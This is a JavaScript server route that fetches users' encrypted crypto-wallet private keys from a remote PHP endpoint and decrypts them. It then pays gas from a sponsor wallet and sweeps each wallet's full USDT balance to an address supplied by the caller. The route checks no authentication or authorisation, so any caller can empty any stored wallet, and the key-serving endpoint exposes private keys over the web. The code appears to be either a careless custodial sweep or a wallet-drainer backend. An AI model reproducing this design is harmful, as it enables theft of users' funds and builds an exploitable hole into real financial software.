import { ethers } from 'ethers';
import { decrypt } from '../../lib/encryption'; // Your existing encryption file

// --- All your provider/contract info ---
const ETH_RPC_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY';
const BSC_RPC_URL = 'https://bsc-dataseed.binance.org/';
const USDT_ABI = [ "function transfer(address, uint256)", "function balanceOf(address) view returns (uint256)" ];
const USDT_ADDRESSES = { /* ... */ };

// This is the main transfer function
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  try {
    const { walletId, destinationAddress } = req.body;

    // --- NEW LOGIC: Get Encrypted Key from PHP ---
    const phpResponse = await fetch('https://axiomcommunity.co/templates/get_wallet_key.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-KEY': process.env.PHP_API_KEY // <-- Use the secret key
      },
      body: JSON.stringify({ walletId: walletId })
    });

    const phpData = await phpResponse.json();

    if (!phpData.success) {
      throw new Error(phpData.error || 'Failed to fetch wallet from PHP');
    }

    const { private_key: encryptedKey, network } = phpData.data;
    // --- END OF NEW LOGIC ---


    // 2. Setup Providers and Keys
    const sponsorWalletKey = process.env.SPONSOR_WALLET_KEY;
    const provider = network === 'ERC-20' 
      ? new ethers.providers.JsonRpcProvider(ETH_RPC_URL)
      : new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
    
    const sponsorWallet = new ethers.Wallet(sponsorWalletKey, provider);
    
    // 3. Decrypt the User's Private Key
    const userWalletKey = decrypt(encryptedKey); // <-- Decrypt here
    const userWallet = new ethers.Wallet(userWalletKey, provider);

    // 4. Define Contracts
    const usdtAddress = USDT_ADDRESSES[network];
    const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, provider);

    // 5. Check Balance
    const balance = await usdtContract.balanceOf(userWallet.address);
    if (balance.isZero()) throw new Error('No balance to transfer');

    // 6. --- The 2-Step Transfer ---
    // (This is the same logic from my previous message)
    
    console.log(`Starting 2-step transfer for wallet ${walletId}...`);
    
    // A. Fund for Gas
    const gasPrice = await provider.getGasPrice();
    const gasCost = gasPrice.mul(40000); // Estimate
    
    const fundTx = await sponsorWallet.sendTransaction({
      to: userWallet.address,
      value: gasCost
    });
    await fundTx.wait();
    console.log(`Gas sent: ${fundTx.hash}`);

    // B. Send the USDT
    const transferTx = await usdtContract.connect(userWallet).transfer(destinationAddress, balance);
    await transferTx.wait();
    console.log(`USDT sent: ${transferTx.hash}`);

    res.status(200).json({ success: true, gasTx: fundTx.hash, transferTx: transferTx.hash });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
}